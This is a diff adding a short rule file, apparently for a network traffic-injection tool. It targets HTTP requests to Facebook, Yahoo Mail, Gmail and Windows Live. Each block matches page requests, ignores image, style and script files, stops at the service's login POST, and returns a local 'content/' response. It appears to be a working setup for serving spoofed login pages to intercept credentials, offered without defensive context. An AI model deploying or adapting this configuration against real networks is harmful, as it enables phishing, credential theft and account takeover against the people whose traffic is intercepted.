@@ -1,0 +1,23 @@
+begin facebook
+match ^GET /(.*?)Host: (www.facebook.com|login.facebook.com|0.channel36.facebook.com)
+ignore ^GET [^ ?]+\.(jpg|jpeg|gif|png|tif|tiff|css|js|ico)
+stop POST /login.php?login_attempt=1 HTTP/1.1
+response content/facebook
+
+begin yahoo
+match ^GET /(.*?)Host: fr.mg[0-9]*.mail.yahoo.com
+ignore ^GET [^ ?]+\.(jpg|jpeg|gif|png|tif|tiff|css|js|ico)
+stop POST /config/login? HTTP/1.1
+response content/yahoo
+
+begin gmail
+match ^GET /(.*?)Host: mail.google.com
+ignore ^GET [^ ?]+\.(jpg|jpeg|gif|png|tif|tiff|css|js|ico)
+stop POST /accounts/ServiceLoginAuth?service=mail HTTP/1.1
+response content/gmail
+
+begin live
+match ^GET /(.*?)Host: (sup|login|home|mail).live.com
+ignore ^GET [^ ?]+\.(jpg|jpeg|gif|png|tif|tiff|css|js|ico)
+stop POST /ppsecure/post.srf HTTP/1.1
+response content/live
